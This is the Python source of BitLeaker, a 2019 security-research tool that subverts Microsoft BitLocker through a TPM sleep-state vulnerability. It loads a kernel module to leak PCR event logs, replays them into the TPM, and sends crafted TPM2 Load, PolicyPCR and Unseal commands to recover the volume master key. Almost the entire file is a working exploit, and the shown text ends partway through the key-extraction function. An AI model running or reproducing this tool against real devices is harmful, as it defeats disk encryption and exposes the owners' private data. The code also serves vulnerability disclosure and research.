#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#
#                           BitLeaker 
#                         ------------
#    Subverting Microsoft's BitLocker with One Vulnerability 
#
#               Copyright (C) 2019 Seunghun Han
#             at the Affiliated Institute of ETRI
#      Project link: https://github.com/kkamagui/bitleaker
#

import subprocess
from enum import Enum
import os
import sys
import re
from binascii import hexlify,unhexlify
from time import sleep


tpm_library_path = "LD_LIBRARY_PATH=tpm2-tools/src/.libs:TPM2.0-TSS/tcti/.libs:TPM2.0-TSS/sysapi/.libs"
dislocker_library_path = "LD_LIBRARY_PATH=dislocker/build/src"

my_env=[]


#
# TPM data for unseal VMK of BitLocker
#
data_tpm2_load256_header = [0x80, 0x02, 0x00, 0x00, 0x00, 0xf7, 0x00, 0x00, 0x01, 0x57, 0x81, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x40, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00]
data_tpm2_load1_header = [0x80, 0x02, 0x00, 0x00, 0x00, 0xdf, 0x00, 0x00, 0x01, 0x57, 0x81, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x40, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00]
data_tpm2_startsession256 = [0x80, 0x01, 0x00, 0x00, 0x00, 0x3b, 0x00, 0x00, 0x01, 0x76, 0x40, 0x00, 0x00, 0x07, 0x40, 0x00, 0x00, 0x07, 0x00, 0x20, 0xe3, 0x4c, 0xe2, 0xd5, 0x48, 0x7f, 0x73, 0x97, 0xb2, 0x8d, 0xb4, 0xe7, 0x93, 0xde, 0x4c, 0x36, 0x91, 0x8a, 0xa5, 0x1f, 0x3b, 0x48, 0x0c, 0x1f, 0x7f, 0x75, 0x79, 0xc5, 0xee, 0xfa, 0xa9, 0x83, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x0b]
data_tpm2_startsession1 = [0x80, 0x01, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x00, 0x01, 0x76, 0x40, 0x00, 0x00, 0x07, 0x40, 0x00, 0x00, 0x07, 0x00, 0x14, 0x30, 0xb9, 0xbd, 0x22, 0x3d, 0x3c, 0x38, 0x95, 0x3d, 0x85, 0x9c, 0xf1, 0x3b, 0xf7, 0xcb, 0xca, 0x88, 0x7a, 0x26, 0x49, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x04]
data_tpm2_policyauthorize = [0x80, 0x01, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x01, 0x6b, 0x03, 0x00, 0x00, 0x00]
data_tpm2_pcrpolicy_header256 = [0x80, 0x01, 0x00, 0x00, 0x00, 0x3a, 0x00, 0x00, 0x01, 0x7f, 0x03, 0x00, 0x00, 0x00]
data_tpm2_pcrpolicy_header1 = [0x80, 0x01, 0x00, 0x00, 0x00, 0x2e, 0x00, 0x00, 0x01, 0x7f, 0x03, 0x00, 0x00, 0x00]
data_tpm2_pcrpolicy_subheader256 = [0x00, 0x00, 0x00, 0x01, 0x00, 0x0b]
data_tpm2_pcrpolicy_subheader1 = [0x00, 0x00, 0x00, 0x01, 0x00, 0x04]
data_tpm2_unseal = [0x80, 0x02, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x01, 0x5e, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
data_tpm2_unseal1= [0x80, 0x02, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x01, 0x5e, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

class Color(Enum):
    #
    # Color codes
    #
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    MAGENTA = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    SUCCESS = GREEN
    FAIL = RED

class State(Enum):
    NO_MARKER = 0
    FOUND_MRKR1 = 1
    FOUND_MRKR2 = 2

class HashTypes(Enum):
    SHA256 = 'SHA256'
    SHA1   = 'SHA1'

class MicrosoftMaterial(Enum):
    # SHA256 of bootmgfw.efi certificate, it is used for PCR #7 (TCG 2.0 SHA256)
    sha256_bootmgfw_cert = '30bf464ee37f1bc0c7b1a5bf25eced275347c3ab1492d5623ae9f7663be07dd5'
    # SHA1 of bootmgfw.efi certificate, it is used for PCR #7 (TCG 2.0 SHA1)
    sha1_bootmgfw_cert = '9fc713b7248d99a1a0db3d50c14eb9b4ff270721'

class Display:
    #
    # Print colored message
    #
    def color_print(self, message, color=Color.WHITE):
        sys.stdout.write(color.value + message + color.ENDC.value)
        return

    #
    # Show a banner.
    #
    def show_banner(self):
        print(self.banner)

    def info_print(self, message):
        self.color_print(message, Color.BOLD)

    def debug_print(self, message, color=Color.YELLOW):
        if self.debug == False: return
        self.color_print(message, color)

    def display_pcrs(self, lines, color=Color.BLUE):
        if self.debug == False: return
        for line in lines:
            str = ' '.join(line)+'\n'
            self.debug_print(str, color)

    def display_raw_logs(self, lines, color=Color.YELLOW):
        if self.debug == False: return
        for line in lines:
            str = ''.join(line)+'\n'
            debug_print(line, color)


class BitLeaker(Display):
    bitlocker_drive = ''
    module_loaded=False
    debug=False
    tcg_version='2.0'
    raw_log_data=[]
    processed_logs=[]
    banner = """\
                                                ,║▒▒▒▒▒▒@╖
                                               ╥▒▒╝    ▒▒▒╢
                                              ]▒▒╢      ]▒▒╢
                                              ]▒▒▒      j▒▒╢
                          ,                 ,╖║▒▒▒
            ,╓╖,  ╓@╬@╥╥╬╣╢╢▓▓            ╖▒╖▒╙▒▒▒░░░▒░▒▒▒▒.
        ║╬@▓╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢[           ╜╜╜╢╢▒▒░░░░░░▒@▓▓▄▒▒▒▒╖
        ╢╢╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢[           ░░░░░╙╢▓╣╬▓▓@@▓▓@░░æ▓▓▓[
        ╢╢╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢..[           ░░░░░ ░▒▒▒▒▒▒▒▒▒▒▓▓▓▒▒▒H
        ╢                    ╢`           ░░░░░░░▒▒▒▒▒▒▒▒▒▒╢▒▒╢╢╢[
        ..╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢            ░░░░░░░▒▒▒▒▒▒▒▒▒▒╢╢╢╢╢╢[
        ╢╢╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢[      ¿░░░,░░░░░░░▒▒▒▒▒▒▒▒▒▒╢╢╢╢╢╢[
        ╢╢╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢░░░░░░░░░░░░╣▓▓@░░░▒▒▒▒▒▒▒▒▒▒╫╣╣╣▓▓[
          ╙╙   ╙╬ ╨╜╙╬╢╢╢╣╣╢╢╢░░░░░░░░░░░░░░░░╫▓@▓▓▓▒▒▒▒▒▒▒▓▓▓▓▓▓[
             ,,, ,░░░░░░░░░░╙╨░░░░░░░░░░░░░░░░░░▓▒▒▒▓▓▓▓▓▓▓▓▓▓▓▀"`
        ,,.░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░]▒░░░╙╢▒▓╣▓▒▒▒▒  ]
        ▐▓█████▄░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░╟▒▒▒▒▒▒▒▒▒╣▓╢╢╢ ░░
        ▐▓▓██████████▄░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▓╢▒▒▒▒╢▓╢╢▒┌░░
        ▐▓▓█████████████████▄░░░▒▒░░▒▒▒▒▒▒▒╢╢╢╢╢╢Ñ▒▒▓╢▒▒▒▒▓╣╢╜▒░░
        ╜▓▓██▀████████████████▌║▒▒▒▒╢╢╢╢╣╢╢╢╣╣╣╣╣╣╣╝╣▒▒╢▓"    ▒░░
        ` "╙``╙╣▀█▀▀██████████▌╢╢╢╢╢╢╢╣╣╣╣╣╢Ñ╜╨Ñ╝`    ╙  ,,   ▒▒▒
                 "` "╨╢▀▀▓▓███▌╢╣╣╣╣╣╣╜╜╨╨╜      ▄, ░░   ,▌ ░░▒▒▒
         ░   e             ╙╣▓▌Ñ╜╙╙╜`            ▌▓ ░░░  ░░░░░▒▒▒
         ░░░░╧╤░░░    ,       ,         ▐░ ░░░░  ░░░░░░░░█▐░▒░▒▒▒
         ░░░░,░░░░░░  ▐,     j▌█    ░ ░░░░░░░░░░░▐░░▒░░░░░░░▒░▒▒▒
         ░░░░▌█░░░░░░░░░░░░ ░░░░░░░░░░░░╪░░░░░░░░░░░▒░░▒░▒▌▒▒▒▒▒▒`
        ▒▒▒▒░▒▒▒▒▒▒░░æ▄▒░▒▒░░æ▄▒▒▒▒▒▒▒▒▌▓▒▒▒▒▒▒▒æ▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒
        ]▒▒▒▒░▒▒▒▒▒▒▒▒╬▒▒▒▒▒▒▒╬▒▒▒▒▒▒▒▒▒▐▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░
        └ ▒░░▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒]▒░▒▒░▒░▒▒▒░▒▒▒░░░ ░░░; ░░
          ▒░░▒▒░▒║░▒▒▒▒▒▒░▒▒▒▒▒░▒]▒▒]░░▒▒░░ ░░▒░▒░▒░░  ░░ ⌡  ░
          ░ ░░▒░▒] ░░▒░▒░░▒▒░]░░▒;▒▒]░░░░ ░ ░░j░░░▒░   ░  !
            ░▒L░░└   ░░  ░▒ ░ ░░▒!▒▒ ░ ░  ░ ░░└ ░ ▒
             ▒L░       ░▒  ░ ░      ░ ░ ░ └ ░

    """ + \
    Color.GREEN.value +'    BitLeaker v1.0 for decrypting BitLocker with the TPM vulnerability\n' + Color.ENDC.value + \
    '             Made by Seunghun Han, https://kkamagui.github.io\n' + \
    '           Project link: https://github.com/kkamagui/bitleaker \n'


    def __init__(self,debug=False):
        self.module_loaded = False
        self.raw_log_data = []
        self.processed_logs = []
        self.debug = debug
        self.bitlocker_drive = ''
        self.show_banner()
        self.manage_kernel_module('start')
        self.hash_type = HashTypes.SHA256
        self.FNULL = open(os.devnull, 'w')
        
    # Try to enter sleep
    #
    def doze(self):
        if self.module_loaded:
            self.info_print('Entering sleep...\n')
            self.info_print('    [>>] Press [Enter] to doze...')
            input('')
            subprocess.call(['rtcwake','--mode','mem','-s','5'], stdout=self.FNULL, stderr=self.FNULL)
            self.info_print('    [<<] Concious...\n')
            # Need this to set the stupid 'orderly' bit
            self.info_print('    [<<] restoring TPM...\n')
            self.manage_kernel_module('stop')
            if self.module_loaded == False:
                subprocess.call(['rtcwake','--mode','mem','-s','30'], stdout=self.FNULL, stderr=self.FNULL)
                self.info_print('    [<<] Concious...\n')
                sleep(1)
                subprocess.call(['tpm2_hierarchycontrol','-C','p','shEnable', 'set'], stdout=self.FNULL, stderr=self.FNULL)
                subprocess.call(['tpm2_hierarchycontrol','-C','p','ehEnable', 'set'], stdout=self.FNULL, stderr=self.FNULL)
            else:
                self.info_print('    [<<<] Module STILL LOADED! \n')
                return False
            return True
        else:
            self.color_print('BitLeaker module is not loaded.', Color.FAIL)
            return False

    #
    # Collect the system logs containing the PCRs
    #
    def collect_pcr_logs(self, filename=''):
        """
        [   27.955579] bitleaker: Virt FFFFAF80C55E0000 Phys 80000
        [   27.955582] bitleaker: evet_version = 2
        [   27.955588] bitleaker: TCG_PCR_EVENT size 36 TCG_PCR_EVENT2 size 12
        [   27.955595] bitleaker: Start 0x6f484000, End 0x6f48ebd5, Trunc 0
        [   27.955610] bitleaker: [1] PCR 0, Event 7, SHA256= 31 37 22 f6 4f 2a 08 57 c6 01 26 6c 89 bf 21 70 0a 7c 4e 79 dc 96 76 4c 2a 35 55 68 2a 3c 7b 7a 
        [   27.955627] bitleaker: [2] PCR 0, Event 8, SHA256= d4 72 0b 40 09 43 82 13 b8 03 56 80 17 f9 03 09 3f 6b ea 8a b4 7d 28 3d b3 2b 6e ab ed bb f1 55 
        [   27.955642] bitleaker: [3] PCR 0, Event 1, SHA256= db e1 4c 63 b7 d0 be dd 3f aa 9d b8 8f 9c 34 ad 75 a6 91 f7 c0 17 7f 70 1e ee 59 5d 44 d9 62 bc 
        [   27.955661] bitleaker: [4] PCR 7, Event 80000001, SHA256= cc fc 4b b3 28 88 a3 45 bc 8a ea da ba 55 2b 62 7d 99 34 8c 76 76 81 ab 31 41 f5 b0 1e 40 a4 0e 
        [   27.955678] bitleaker: [5] PCR 7, Event 80000001, SHA256= 78 68 42 98 cc 54 cf 75 50 bd 38 d3 c3 78 ee ee 59 d3 ae 02 76 32 cd a6 f5 07 ac 5c cd 25 7b 35 
        ... omitted ...
        [   27.957613] bitleaker: == End of Data ==
        """
        self.raw_log_data = []
        self.info_print('Collecting {0} PCRs from system logs...\n'.format(self.hash_type.value))
        try:
            if filename == '':
                output = subprocess.check_output(['dmesg'],encoding='UTF-8').split('\n');
            else:
                infile =  open(filename, 'r')
                output = infile.readlines()
                infile.close()
            state = State.NO_MARKER
            for line in output:
                if state == State.FOUND_MRKR1:
                    if self.hash_type.value in line:
                        state = State.FOUND_MRKR2
                if state == State.FOUND_MRKR2:
                    if 'End of Data' in line:
                        break
                    self.raw_log_data.append(line)           
                if state == State.NO_MARKER:
                    if 'Dump event logs' in line:
                        state = State.FOUND_MRKR1
        except:
           pass 
        self.info_print('    [>>] Found {0:d} log lines.\n'.format(len(self.raw_log_data)))
        self.display_raw_logs(self.raw_log_data,Color.YELLOW)
        return self.raw_log_data

    def process_pcr_logs(self):
        selected_raw_logs = []
        if len(self.raw_log_data)==0: return False
        self.info_print('Processing logs...\n')
        ev_separator_found = False
        for line in self.raw_log_data:
            if ev_separator_found and 'PCR 7' in line:
                break
            if 'Event 4' in line:
                ev_separator_found = True

            selected_raw_logs.append(line)

        self.info_print('    [>>] Extract PCR numbers and {0} hashes... \n'.format(self.hash_type.value))
        expression = r'(?<={0}=).*'.format(self.hash_type.value)
        for line in selected_raw_logs:
            match = re.search(r'\d+?,', line)
            pcr_num = match.group(0).replace(',', ' ')

            match = re.search(expression, line)
            hash  = match.group(0).replace(' ', '')
            self.processed_logs.append([pcr_num, hash])

        if len(self.processed_logs) != 0:
            self.color_print('Found {0} PCR logs.\n'.format(len(self.processed_logs)), Color.SUCCESS)
            self.display_pcrs(self.processed_logs)
            return True
        else:
            self.color_print('    [>>>]NO PCR LOGS FOUND[<<<]\n', Color.FAIL)
            return False
        
    def leak(self,filename=''):
        if self.module_loaded:
            self.info_print('Preparing PCR data...\n')
            if self.doze():
                if len(self.collect_pcr_logs(filename)) == 0:
                    self.hash_type = HashTypes.SHA1
                    if len(self.collect_pcr_logs(filename)) == 0:
                       self.color_print("    [>>>] NO LOGS FOUND! Check BitLeaker kernel module. [<<<]\n",Color.RED)
                       sys.exit(-1)
        else:
            self.color_print("    [>>>] Bitleaker module not loaded.  Fix this! [<<<]\n",Color.RED)

    def start_tpm(self):
        tpm_device="device:/dev/tpm0"
        self.info_print("Restarting TPM...")
        subprocess.check_call(['sudo','TPMTOOLS2_TCTI="{0}"'.format(tpm_device),'tpm2_startup','-c'])
        self.info_print("   [>>] Waiting for you to run selftest")
        input('')
        #subprocess.check_call(['sudo','TPMTOOLS2_TCTI="{0}"'.format(tpm_device),'tpm2_selftest','-f'])
        self.info_print("   [>>] Done...")
    
    def manage_kernel_module(self, mode="start"):
        if mode == "start" and not self.module_loaded:
            try:
                output = subprocess.check_output(['lsmod'])
                if b'leak' in output:
                    self.module_loaded = True
                    self.color_print('BitLeaker Module LOADED.\n', Color.SUCCESS)
                else:
                    subprocess.check_call(['insmod','./bitleaker-kernel-module/bitleaker-kernel-module.ko'])
                    self.color_print('BitLeaker Module LOADED.\n', Color.SUCCESS)
                    self.module_loaded = True
            except subprocess.CalledProcessError as e:
                self.color_print('BitLeaker Module FAILED loading.\n', Color.FAIL)
            if self.module_loaded: return True
            else: return False
        if mode == "stop" and self.module_loaded:
            try:
                subprocess.check_call(['rmmod','bitleaker-kernel-module'])
                self.color_print('BitLeaker Module UNLOADED.\n', Color.SUCCESS)
                self.module_loaded = False
            except subprocess.CalledProcessError as e:
                self.color_print('Stop FAILED\n',Color.FAIL)
            if self.module_loaded == False: return True
            else: return False

    def find_bitlocker_parition(self,filename=''):
        if filename=='':
            self.info_print('Finding BitLocker partitions... \n')
            output = subprocess.check_output('sudo fdisk -l 2>/dev/null | grep "Microsoft basic data"', encoding='UTF-8',shell=True).split('\n')
            if len(output) == 0:
                self.color_print('    [>>] BitLocker-locked parition is not found.\n', Color.FAIL)
                self.info_print('    [>>] Please try with the explicit drive path.  ./bitleaker-3-v1.py <drive path>\n')
                return False
            self.bitlocker_drive = output[0].split(' ')[0]
        else:
            self.bitlocker_drive = filename
        self.info_print('    [>>] BitLocker-locked partition is [%s]\n\n' % self.bitlocker_drive)
        return True

    def bitlocker_path(self):
        return self.bitlocker_drive

    def logs(self):
        return self.processed_logs

    def type(self):
        return self.hash_type.value

filename = 'key.txt'

class TPMInterface(Display):
    _type = HashTypes.SHA256.value
    logs = []
    def __init__(self, logs, type=HashTypes.SHA256.value):
        self._type = type
        self.logs = logs

    def Type(self):
        return self._type

    #
    # Check resource manager is running and run it
    #
    def start_rsrc_mgr(self):
        output = subprocess.getoutput('sudo ps -e | grep resourcemgr')
        if 'resourcemgr' in output:
            self.info_print('    [>>] Resource manager process... ')
            sys.stdout.flush()
            self.color_print('Running\n', Color.SUCCESS)
            return 0

        self.info_print('    [>>] Starting resource manager process... ')
        sys.stdout.flush()
        pid = os.fork()
        if pid == 0:
            subprocess.getoutput('sudo %s TPM2.0-TSS/resourcemgr/resourcemgr > /dev/null' % (tpm_library_path))
            sys.exit(0)
        else:
            # Wait for the resource manager
            resourcemgr_found = False

            for i in range(0, 10):
                output = subprocess.getoutput('ps -e | grep resourcemgr')
                if len(output) != 0:
                    resourcemgr_found = True
                    break
                sleep(1)

            if resourcemgr_found == False:
                self.color_print('Fail\n', Color.FAIL)
                sys.exit(-1)

        self.color_print('Success\n', Color.SUCCESS)
        sleep(2)
        return 0

    def stop_rsrc_mgr(self):
        subprocess.call('sudo killall resourcemgr',shell=True)
        return

    def tpm_extendpcr(self,pcr,hash):
        local_pcr = pcr.replace(' ','')
        if self._type == 'SHA256':
            output = subprocess.check_output('tpm2_pcrextend %s:sha256=%s' % (local_pcr, hash), shell=True, encoding='UTF-8')
        else:
            output = subprocess.check_output('tpm2_pcrextend %s:sha1=%s' % (local_pcr, hash), shell=True, encoding='UTF-8')
        return output

    def tpm_listpcrs(self):
        if self._type == 'SHA256':
            output = subprocess.check_output('tpm2_pcrread sha256', shell=True, encoding='UTF-8')
        else:
            output = subprocess.check_output('tpm2_pcrread sha1', shell=True, encoding='UTF-8')
        return output

    #
    # Replay PCR data to the TPM
    #
    def replay_logs(self):
        self.info_print('Replay TPM data.\n')

        output = self.tpm_listpcrs()
        print(output + '\n')
        for pcr_data in self.logs:
            self.info_print('    [>>] PCR %s, SHA1 = %s\n' % (pcr_data[0], pcr_data[1]))
            output = self.tpm_extendpcr(pcr_data[0], pcr_data[1])
            print(output + '\n')

        # Last one for PCR #7
        last_hash = MicrosoftMaterial.sha256_bootmgfw_cert.value
        if self._type == HashTypes.SHA1.value:
            last_hash = MicrosoftMaterial.sha1_bootmgfw_cert.value
        self.info_print('    [>>] Last PCR 7, SHA1 = %s\n' % (last_hash))
        output = self.tpm_extendpcr('7',last_hash)
        output = self.tpm_listpcrs()
        print(output + '\n')

    #
    # Extract private/public data and PCR policy 
    #
    def extract_priv_pub_and_pcr_policy_from_raw_blob(self,raw_tpm_blob):
        if self._type == HashTypes.SHA1.value:
            hash_length = 20
        else:
            hash_length = 32
            
        hex_data = []
        for line in raw_tpm_blob:
            line = line.replace('-', ' ')
            line = line.replace('  ', ' ')
            data_list = line.split(' ')
            hex_data = hex_data + data_list[:-1]

        hex_data = hex_data[:]

        print("hex_data({0},{1}{2}:".format(hash_length,len(hex_data),hash_length+2),end="")
        print(hex_data)
        priv_pub = [int(hex_data[i], 16) for i in range(0, len(hex_data)-(hash_length+6))]
        pcr_policy = [int(hex_data[i], 16) for i in range(len(hex_data)-(hash_length+6), len(hex_data))]
        return(priv_pub, pcr_policy)

    #
    # Prepare TPM data for unsealing VMK of BitLocker
    #
    def prepare_tpm_data(self, drive_path):
        if self._type == HashTypes.SHA1.value:
            load_header      = data_tpm2_load1_header
            start_session    = data_tpm2_startsession1
            policy_authorize = data_tpm2_policyauthorize
            pcrpolicy_hdr    = data_tpm2_pcrpolicy_header1
            pcrpolicy_subhdr = data_tpm2_pcrpolicy_subheader1
            unseal_hdr       = data_tpm2_unseal
        else:
            load_header      = data_tpm2_load256_header
            start_session    = data_tpm2_startsession256
            policy_authorize = data_tpm2_policyauthorize
            pcrpolicy_hdr    = data_tpm2_pcrpolicy_header1
            pcrpolicy_subhdr = data_tpm2_pcrpolicy_subheader256
            unseal_hdr       = data_tpm2_unseal
        self.info_print('Preparing TPM data.\n')
        self.info_print('    [>>] Get TPM-encoded blob from dislocker... ')
        raw_data_list = get_raw_tpm_encoded_blob_from_dislocker(drive_path)
        if raw_data_list == []:
            print('BitLeaker: Error. %s is not BitLocker-locked partition\n' % drive_path)
            sys.exit(-1)
        self.color_print('Success\n', Color.SUCCESS)

        self.info_print('    [>>] Convert TPM-encoded blob to hex data... ')
        hex_priv_pub, pcr_policy = self.extract_priv_pub_and_pcr_policy_from_raw_blob(raw_data_list)
        self.color_print('Success\n', Color.SUCCESS)
        self.info_print('    [>>] raw_data_list:\n%s,%d\n' % (raw_data_list, len(raw_data_list)))
        self.info_print('    [>>] hex_priv:\n%s,%d\n' % (hex_priv_pub, len(hex_priv_pub)))
        self.info_print('    [>>] pcr_policy:\n%s,%d\n' % (pcr_policy, len(pcr_policy)))

        # Prepare TPM2_Load data
        self.info_print('    [>>] Create TPM2_Load data... ')
        data = load_header + hex_priv_pub
        file = open('tpm2_load.bin', 'wb')
        file.write(bytearray(data))
        file.close()
        self.color_print('Success\n', Color.SUCCESS)

        # Prepare TPM2_StartSession data
        self.info_print('    [>>] Create TPM2_StartSession data... ')
        data = start_session
        file = open('tpm2_startsession.bin', 'wb')
        file.write(bytearray(data))
        file.close()
        self.color_print('Success\n', Color.SUCCESS)

        # Prepare TPM2_PolicyAuthorize data
        self.info_print('    [>>] Create TPM2_PolicyAuthorize data... ')
        data = policy_authorize
        file = open('tpm2_policyauthorize.bin', 'wb')
        file.write(bytearray(data))
        file.close()
        self.color_print('Success\n', Color.SUCCESS)

        # Prepare TPM2_PCRPolicy data
        self.info_print('    [>>] Create TPM2_PolicyPCR data... ')
        data1 = pcrpolicy_hdr + pcr_policy[:len(pcr_policy) - 4]
        data2 = pcrpolicy_subhdr + pcr_policy[len(pcr_policy) - 4:]
        file = open('tpm2_policypcr.bin', 'wb')
        file.write(bytearray(data1))
        file.write(bytearray(data2))
        file.close()
        self.color_print('Success\n', Color.SUCCESS)

        # Prepare TPM2_Unseal data
        self.info_print('    [>>] Create TPM2_Unseal data... ')
        data = unseal_hdr
        file = open('tpm2_unseal.bin', 'wb')
        file.write(bytearray(data))
        file.close()
        self.color_print('Success\n\n', Color.SUCCESS)

    #
    # Execute TPM2 command data for unsealing VMK 
    #
    def execute_tpm_cmd_and_extract_vmk(self):
        self.info_print('Execute TPM commands\n')
        # Execute TPM2_Load command 
        self.info_print('    [>>] Execute TPM2_Load... ')
        f = open('tpm2_load.bin','rb')
        p = subprocess.Popen(['tpm2_send','-o','load-out.bin'],env=my_env,stdout=subprocess.PIPE,stdin=f)
        output, err = p.communicate()
        #output = subprocess.check_call(['tpm2_send','-o','load-out.bin'],encoding='UTF-8',stdin=f)
        self.color_print('    [>>] Success\n', Color.SUCCESS)
        f.close()
        sleep(2)

        # Execute TPM2_StartSession command 
        self.info_print('    [>>] Execute TPM2_StartSession... ')
        f = open('tpm2_startsession.bin','rb')
        p = subprocess.Popen(['tpm2_send','-o','startsession-out.bin'],env=my_env,stdout=subprocess.PIPE,stdin=f)
        output, err = p.communicate()
        self.color_print('    [>>] Success\n', Color.SUCCESS)
        f.close()
        sleep(2)

        # Execute TPM2_PolicyAuthorize command 
        self.info_print('    [>>] Execute TPM2_PolicyAuthorize... ')
        f = open('tpm2_policyauthorize.bin','rb')
        p = subprocess.Popen(['tpm2_send','-o','policyauth-out.bin'],env=my_env,stdout=subprocess.PIPE,stdin=f)
        output, err = p.communicate()
        self.color_print('    [>>] Success\n', Color.SUCCESS)
        f.close()
        sleep(2)

        # Execute TPM2_PolicyPCR command 
        self.info_print('    [>>] Execute TPM2_PolicyPCR... ')
        f = open('tpm2_policypcr.bin','rb')
        p = subprocess.Popen(['tpm2_send','-o','policypcr-out.bin'],env=my_env,stdout=subprocess.PIPE,stdin=f)
        output, err = p.communicate()
        self.color_print('    [>>] Success\n', Color.SUCCESS)
        f.close()
        sleep(2)

        # Execute TPM2_Unseal command 
        self.info_print('    [>>] Execute TPM2_Unseal... ')
        f = open('tpm2_unseal.bin','rb')
        p = subprocess.Popen(['tpm2_send','-o','unseal-out.bin'],env=my_env,stdout=subprocess.PIPE,stdin=f)
        output, err = p.communicate()
        self.color_print('    [>>] Success\n', Color.SUCCESS)
        f.close()
        sleep(2)

        # Extract VMK from TPM result
        #vmk_data = extract_vmk_from_tpm_result(output.split('\n'))
        #return vmk_data

# 
# Extract TPM encoded blob from Dislocker tool
#
def get_raw_tpm_encoded_blob_from_dislocker(drive_path):
    """
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000000 00 8a 00 20 17 a4 c4 51-c1 ee 18 52 89 b0 e3 ac
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000010 39 65 f7 32 25 5b 87 ac-31 14 ed 1a 99 ac 62 4c
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000020 b2 90 b5 c1 00 10 8c cf-34 58 f5 1a 18 04 f9 2e
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000030 62 fa e3 93 a0 d1 ce 1f-49 99 9b ac 6d e8 27 97
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000040 c9 f9 c2 20 aa e7 23 1f-7c 68 1e 7e 74 65 c6 89
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000050 d9 f2 94 15 51 0f a1 8a-64 ae f6 c0 01 bb 8b 67
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000060 0a 2d 3b 65 15 f1 62 51-2d 8b 61 0d 8b 98 3f 76
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000070 b3 3f 64 7a 12 59 74 bb-60 e5 ad 5e 61 a1 31 3c
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000080 f9 90 17 6c fe 07 eb 49-20 69 55 66 00 4e 00 08
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000090 00 0b 00 00 04 12 00 20-6f b5 05 0c 0a 64 e6 ff
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000a0 2e 0a f1 8e 9c d8 26 40-87 44 b0 f2 08 4a bc a9
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000b0 c7 cd 7e 72 17 de cc f0-00 10 00 20 3d c3 40 aa
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000c0 98 5b 5b 48 50 9e 71 c2-19 03 0a bc bd 95 a6 10
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000d0 22 12 2d e3 e6 50 63 79-af f1 3c c4 00 20 5f f5
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000e0 9b 8f b8 7c 48 dc 43 68-60 eb a2 70 cc a2 22 4e
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000f0 7b b9 f0 83 ed fe 78 91-fa ed e2 b4 de 5a 03 80
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000100 08 00
    """
    # Run Dislocker with debug mode
    #print("Library path: %s, drive_path %s\n" % (dislocker_library_path,drive_path))
    output = subprocess.getoutput('sudo %s dislocker-metadata -v -v -v -v -V %s' % (dislocker_library_path, drive_path)).split('\n')
    #print("output = %s" % (output))

    first_marker_found = 0
    second_marker_found = 0
    raw_data = []
    for line in output:
        if 'TPM_ENCODED' in line:
            first_marker_found = 1

        if first_marker_found == 1 and '0x00000000' in line:
            second_marker_found = 1

        if second_marker_found == 1 and not '0x000000' in line:
            break

        if second_marker_found == 1:
            raw_data.append(line[44:])

    return raw_data

#
# Extract VMK from TPM result
#
def extract_vmk_from_tpm_result(tpm_output):
    """
    [>>] Execute TPM2_Unseal... Input file tpm2_unseal.bin
Initializing Local Device TCTI Interface
    [>>] Input Size 27
00000000  80 02 00 00 00 1b 00 00  01 5e 80 00 00 01 00 00  |.........^......|
00000010  00 09 03 00 00 00 00 00  00 00 00                 |...........|

    [>>] Output Size 97, Result: Success
00000000  80 02 00 00 00 61 00 00  00 00 00 00 00 2e 00 2c  |.....a.........,|
00000010  2c 00 05 00 01 00 00 00  03 20 00 00 88 2e b7 28  |,........ .....(|
00000020  33 cd 21 05 f5 38 ea 60  89 51 62 e8 61 5b 0c ed  |3.!..8.`.Qb.a[..|
00000030  6a 63 7e f9 17 83 55 e9  0f 70 95 09 00 20 df e3  |jc~...U..p... ..|
